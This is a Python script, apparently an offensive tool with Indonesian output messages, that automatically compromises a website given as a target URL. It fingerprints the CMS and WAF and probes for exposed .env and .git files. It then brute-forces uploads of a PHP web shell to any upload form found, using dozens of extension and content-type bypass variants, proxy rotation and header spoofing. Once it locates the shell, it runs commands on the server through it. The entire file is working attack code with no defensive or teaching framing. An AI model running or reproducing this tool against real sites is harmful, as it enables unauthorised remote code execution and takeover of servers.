import requests
from bs4 import BeautifulSoup
import re
from urllib.parse import urljoin, urlparse
import random
import time

def logo():
  print("""
  
 ░▒▓███████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░      ░▒▓█▓▒░        
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░        
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░        
 ░▒▓██████▓▒░░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓█▓▒░      ░▒▓█▓▒░        
       ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░        
       ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░        
░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓████████▓▒░▒▓████████▓▒░ 
                                                                   
                                                                   
""")
print(logo())

class AdaptiveShellUploader:
    def __init__(self, target_url):
        self.target_url = target_url if target_url.endswith('/') else target_url + '/'
        self.session = requests.Session()
        self.cms = None
        self.waf_detected = False
        self.upload_form = None
        self.headers = {}
        self.possible_shell_paths = []
        self.proxies = self.load_proxies()
        self.proxy = random.choice(self.proxies) if self.proxies else None
        self.shell_payload = {
    'php': '<?php echo "SHELL_OK"; system($_GET["cmd"]); ?>',
    'filename_variants': [
        'shell.php', 'shell.pHp', 'shell.php5', 'shell.php7', 'shell.php4', 'shell.php3',
        'shell.phtml', 'shell.phar', 'shell.inc', 'shell.php.inc', 'shell.php.ini',
        'shell.php.jpeg', 'shell.php.jpg', 'shell.php.png', 'shell.php.gif', 'shell.php.bmp',
        'shell.php.svg', 'shell.php.webp', 'shell.php.txt', 'shell.php.log',
        'shell.php.rar', 'shell.php.zip', 'shell.php.tar.gz', 'shell.php.gz',
        'shell.php.backup', 'shell.back.php', 'shell.old.php', 'shell.new.php',
        'shell.tmp.php', 'shell.test.php', 'shell.upload.php', 'shell.injected.php',
        'shell.cgi.php', 'shell.jsp.php', 'shell.asp.php', 'shell.shtml.php',
        'shell.php;.jpg', 'shell.php%00.jpg', 'shell.php%20', 'shell.php%0a',
        'shell.PHP', 'shell.pHp3', 'shell.PHp5', 'shell.PHP7', 'shell.Phtml',
        'shell.fakeextension.jpg', 'shell.php.fake.jpg', 'shell.jpg.php',
        'shell.png.php', 'shell.php:.jpg', 'shell.php..jpg', 'shell...php',
        '.shell.php', 'shell1.php', 'shell123.php', 'cmdshell.php', 'reverse_shell.php',
        'shell.proxy.php', 'access.php', 'admin.php', 'phpinfo.php'
    ],
    'content_types': [
        'application/x-php', 'image/jpeg', 'image/png', 'image/gif', 'image/webp',
        'application/octet-stream', 'application/x-httpd-php', 'application/x-php-script',
        'multipart/form-data', 'application/x-www-form-urlencoded',
        'text/plain', 'text/html', 'text/x-php', 'text/x-shellscript',
        'application/x-shellscript', 'application/x-perl', 'application/x-cgi',
        'application/x-executable', 'application/x-binary', 'application/force-download',
        'application/download', 'application/php', 'text/x-server-parsed-html',
        'application/x-php5', 'application/x-php7', 'application/x-phtml',
        'application/vnd.php', 'text/php'
    ]
}
        self.waf_indicators = [
        'X-WAF-Detected', 'CF-RAY', 'X-Sucuri-ID', 'X-Akamai-Transformed', 'X-Distil-CS',
        'X-Mod-Security', 'X-Powered-By-AspNet', 'X-CDN', 'X-Cache', 'X-Proxy-Cache',
        'X-Imunify360-Tag', 'Server: cloudflare', 'X-FireEye', 'X-WAF-Block', 'X-Powered-By: WAF',
        'X-Security-Policy', 'X-Azure-WAF', 'X-Sitelock-ID', 'X-Edge-WAF', 'X-WAF-Response',
        'WAF-Status', 'X-Wallarm', 'X-StackPath-Protection', 'X-Imperva-ID', 'X-Reblaze-ID',
        'X-DataDome', 'X-Fortinet', 'X-Radware', 'X-360-WAF', 'X-WAF-Status', 'X-SiteLock',
        'X-Cache-Status', 'X-Cloud-WAF', 'X-Armor', 'X-Application-Guard', 'X-Kona-Security',
        'X-WAF-Protection', 'X-Alert', 'X-NAXSI', 'X-WAF-Defense', 'X-Intercepted-By',
        'X-Shield', 'X-Anti-DDoS', 'X-Threat-Detected', 'X-HackerGuard', 'X-SecureWall',
        'X-Attack-Detected', 'X-Zenedge', 'X-Varnish-Cache', 'X-Edge-Block'
      ]

    def load_proxies(self):
        try:
            with open("proxies.txt", "r") as f:
                return [line.strip() for line in f.readlines() if line.strip()]
        except:
            return []

    def get_random_headers(self):
        try:
            resp = self.session.get(self.target_url, timeout=5)
            user_agent = resp.request.headers.get('User-Agent', 'Mozilla/5.0')
            referer = resp.url
            x_forwarded = resp.headers.get('X-Forwarded-For', '127.0.0.1')
            return {
                'User-Agent': user_agent,
                'Referer': referer,
                'X-Forwarded-For': x_forwarded
            }
        except:
            return {
                'User-Agent': 'Mozilla/5.0',
                'Referer': self.target_url,
                'X-Forwarded-For': '127.0.0.1'
            }

    def recon(self):
        print('[*] Melakukan recon ke target:', self.target_url)
        try:
            start_time = time.time()
            resp = self.session.get(self.target_url, timeout=10, proxies={"http": self.proxy, "https": self.proxy} if self.proxy else None)
            response_time = time.time() - start_time

            self.headers = resp.headers
            status = resp.status_code
            content_len = len(resp.text)
            final_url = resp.url

            print(f'[+] Header: {self.headers}')
            print(f'[+] Status Code: {status}')
            print(f'[+] Response Time: {response_time:.2f}s')
            print(f'[+] Content Length: {content_len}')
            print(f'[+] Final Redirect URL: {final_url}')

            for indicator in self.waf_indicators:
                if indicator in resp.headers:
                    print(f'[!] WAF terdeteksi melalui header: {indicator}')
                    self.waf_detected = True

            if status in [403, 406, 501, 502]:
                print(f'[!] Status code {status} menunjukkan kemungkinan WAF/CDN aktif')
                self.waf_detected = True

            soup = BeautifulSoup(resp.text, 'html.parser')

            generator_meta = soup.find('meta', attrs={'name': 'generator'})
            if generator_meta and 'content' in generator_meta.attrs:
                generator = generator_meta['content'].lower()
                if 'wordpress' in generator:
                    self.cms = 'WordPress'
                elif 'joomla' in generator:
                    self.cms = 'Joomla'
                elif 'drupal' in generator:
                    self.cms = 'Drupal'
                elif 'magento' in generator:
                    self.cms = 'Magento'
                elif 'prestashop' in generator:
                    self.cms = 'Prestashop'
                elif 'blogger' in generator:
                    self.cms = 'Blogger'

            content = resp.text.lower()
            if not self.cms:
                if 'wp-content' in content:
                    self.cms = 'WordPress'
                elif '/sites/all' in content:
                    self.cms = 'Drupal'
                elif '/skin/frontend' in content:
                    self.cms = 'Magento'
                elif '/modules/' in content and 'prestashop' in content:
                    self.cms = 'Prestashop'

            print('[+] CMS terdeteksi:', self.cms)

            forms = soup.find_all('form')
            for form in forms:
                if form.find('input', {'type': 'file'}):
                    self.upload_form = form
                    print('[+] Form upload ditemukan.')
                    break

            if not self.upload_form:
                iframe_tags = soup.find_all('iframe')
                for iframe in iframe_tags:
                    src = iframe.get('src')
                    if src:
                        iframe_url = urljoin(self.target_url, src)
                        try:
                            iframe_resp = self.session.get(iframe_url, timeout=10)
                            if re.search(r'<form.*?input[^>]+type=[\'"]?file[\'"]?', iframe_resp.text, re.I):
                                self.upload_form = BeautifulSoup(iframe_resp.text, 'html.parser').find('form')
                                print('[+] Form upload ditemukan dalam iframe:', iframe_url)
                                break
                        except:
                            continue

            if not self.upload_form and re.search(r'<form[^>]+>.*?type=[\'"]?file[\'"]?', resp.text, re.I | re.S):
                self.upload_form = soup.find('form', string=re.compile(r'type=["\']?file["\']?', re.I))
                print('[+] Form upload ditemukan dengan regex scanning.')

            self.deep_osint()

        except Exception as e:
            print('[!] Gagal melakukan recon:', str(e))

    def deep_osint(self):
        print('[*] Melakukan OSINT tambahan...')
        paths = ['robots.txt', 'sitemap.xml', '.env', '.git/config', '.DS_Store']
        for path in paths:
            url = urljoin(self.target_url, path)
            try:
                resp = self.session.get(url, timeout=5)
                if resp.status_code == 200 and len(resp.text.strip()) > 10:
                    print(f'[+] Ditemukan {path}: {url}')
            except:
                continue

    def decision_engine(self):
        if self.cms == 'WordPress' and self.upload_form:
            print('[*] Deteksi WordPress dengan form upload, lanjut ke WP shell upload...')
            return 'wp_upload'
        elif self.cms == 'Laravel':
            print('[*] Laravel terdeteksi, coba ke folder publik...')
            return 'laravel_upload'
        elif self.waf_detected:
            print('[*] WAF aktif, coba dengan nama file dan content-type obfuscation...')
            return 'bypass_upload'
        elif self.upload_form:
            print('[*] Form upload umum ditemukan, coba brute upload standar...')
            return 'generic_upload'
        else:
            print('[!] Tidak ada jalur upload yang jelas, hentikan eksekusi.')
            return None
    def generate_shell_file(self, filename, content_type):
        from io import BytesIO
        shell_content = self.shell_payload['php'].encode()
        shell_file = BytesIO(shell_content)
        shell_file.name = filename
        return (filename, shell_file, content_type)

    def upload_shell(self):
        strategy = self.decision_engine()
        if not strategy:
            print('[!] Tidak bisa menentukan strategi upload. Abort.')
            return

        try:
            print(f'[*] Menjalankan strategi: {strategy}')
            if strategy in ['wp_upload', 'generic_upload', 'bypass_upload']:
                for variant in self.shell_payload['filename_variants']:
                    for content_type in self.shell_payload['content_types']:
                        file_tuple = self.generate_shell_file(variant, content_type)
                        files = {'file': file_tuple}
                        action = self.upload_form.get('action') or self.target_url
                        action_url = urljoin(self.target_url, action)
                        print(f'[*] Uploading ke: {action_url} dengan file: {variant}, type: {content_type}')
                        resp = self.session.post(
                            action_url,
                            files=files,
                            headers=self.get_random_headers(),
                            proxies={"http": self.proxy, "https": self.proxy} if self.proxy else None
                        )

                        if 'SHELL_OK' in resp.text or resp.status_code == 200:
                            shell_path = self.find_shell_path(variant)
                            if shell_path:
                                print(f'[+] Shell berhasil diupload di: {shell_path}')
                                self.possible_shell_paths.append(shell_path)
                                return
                            else:
                                print('[!] Upload berhasil, tapi shell tidak ditemukan.')
            elif strategy == 'laravel_upload':
                for folder in ['storage', 'uploads', 'public', 'files', 'tmp']:
                    for variant in self.shell_payload['filename_variants']:
                        try:
                            upload_url = urljoin(self.target_url, f"{folder}/{variant}")
                            print(f'[*] Menguji akses ke: {upload_url}')
                            resp = self.session.get(upload_url, timeout=5)
                            if 'SHELL_OK' in resp.text:
                                print(f'[+] Shell Laravel ditemukan di: {upload_url}')
                                self.possible_shell_paths.append(upload_url)
                                return
                        except:
                            continue
        except Exception as e:
            print(f'[!] Upload gagal: {e}')

    def find_shell_path(self, filename):
        guessed_paths = [
          'uploads/', 'upload/', 'files/', 'file/', 'images/', 'img/', 'media/', 'docs/', 'documents/',
          'content/', 'contents/', 'public/', 'static/', 'cdn/', 'assets/', 'asset/', 'data/', 'tmp/', 'temp/',
          'admin/uploads/', 'admin/files/', 'wp-content/uploads/', 'wp-includes/', 'themes/', 'includes/',
          'includes/images/', 'wp-content/themes/', 'wp-content/plugins/', 'wordpress/wp-content/uploads/',
          'site/wp-content/uploads/', 'custom/uploads/', 'core/uploads/', 'resources/views/uploads/',
          '.hidden/', '.private/', '.uploads/', '.files/', '_uploads/', '__uploads__/', '_files/', '__files__/',
          'htdocs/uploads/', 'html/uploads/', 'httpdocs/uploads/', 'public_html/uploads/', 'web/uploads/',
          'site/uploads/', 'website/uploads/', 'server/uploads/', 'app/uploads/', 'application/uploads/',
          'backup/', 'backups/', 'logs/', 'log/', 'output/', 'export/', 'import/', 'download/', 'downloads/',
          'cmd/', 'cmds/', 'shells/', 'php-shells/', 'bin/uploads/', 'engine/uploads/', 'store/', 'storage/',
          '../../uploads/', '../../../uploads/', '../../../../uploads/', '../../../../../../uploads/',
          '../../files/', '../../../files/', '../../../../files/', '../../../../../../files/',
          '../../wp-content/uploads/', '../../../wp-content/uploads/',
          '/var/www/html/uploads/', '/srv/www/site/uploads/', '/home/user/public_html/uploads/',
          '/usr/share/nginx/html/uploads/', '/opt/lampp/htdocs/uploads/',
          'media/uploads/', 'media_files/', 'userfiles/', 'user_files/', 'myfiles/', 'my_files/',
          'custom/uploads/images/', 'admin/uploads/tmp/', 'files/media/', 'backup/uploads/', 'export/files/',
          'documents/uploaded/', 'docs/uploads/', 'ftp/uploads/', 'ftp/files/', 'mail/uploads/',
          'user_data/uploads/', 'user_uploads/', 'dump/uploads/', 'dump/files/', 'restore/uploads/',
          'patch/uploads/', 'dev/uploads/', 'test/uploads/', 'testing/uploads/', 'demo/uploads/',
          'examples/uploads/', 'samples/uploads/', 'files/examples/', 'versions/uploads/',
          'images/uploads/', 'images/files/', 'user/images/', 'profile/images/', 'admin/media/',
          'old/uploads/', 'old_files/', 'archive/uploads/', 'legacy/uploads/',
          'cgi-bin/uploads/', 'cgi-bin/files/', 'webapp/uploads/', 'framework/uploads/',
          'logs/files/', 'sys/uploads/', 'sys/files/', 'runtime/uploads/', 'cache/uploads/',
          'shell/uploads/', 'inject/uploads/', 'scripts/uploads/', 'payloads/uploads/', 'hacked/uploads/',
          'db/uploads/', 'db_dumps/', 'database/uploads/', 'mysql/uploads/', 'sql/uploads/',
          'env/uploads/', 'config/uploads/', 'secure/uploads/', 'vault/uploads/', 'private/uploads/',
          'cloud/uploads/', 'infra/uploads/', 'api/uploads/', 'api/files/', 'json/uploads/', 'xml/uploads/',
          'misc/uploads/', 'misc/files/', 'lib/uploads/', 'libs/uploads/', 'modules/uploads/',
          'functions/uploads/', 'php/uploads/', 'python/uploads/', 'cgi/uploads/',
          'nginx/uploads/', 'apache/uploads/', 'iis/uploads/', 'webserver/uploads/',
          'platform/uploads/', 'plugin/uploads/', 'themes/uploads/', 'vendor/uploads/',
          'tools/uploads/', 'exploit/uploads/', 'malware/uploads/', 'webshell/uploads/', 'root/uploads/'
        ]

        for path in guessed_paths:
            shell_url = urljoin(self.target_url, path + filename)
            try:
                resp = self.session.get(shell_url, timeout=5)
                if 'SHELL_OK' in resp.text:
                    return shell_url
            except:
                continue
        return None

    def exec_shell(self, cmd='id'):
        for path in self.possible_shell_paths:
            try:
                print(f'[*] Mencoba eksekusi shell: {path}?cmd={cmd}')
                resp = self.session.get(f'{path}?cmd={cmd}', timeout=5)
                if resp.status_code == 200 and 'SHELL_OK' in resp.text:
                    print('[+] Output dari shell:')
                    print(resp.text)
                    return
            except:
                continue
        print('[!] Eksekusi shell gagal di semua path.')

if __name__ == '__main__':
    target = input('[?] Masukkan URL target (contoh: http://target.com/): ').strip()
    uploader = AdaptiveShellUploader(target)
    uploader.recon()
    uploader.upload_shell()
    uploader.exec_shell('whoami')
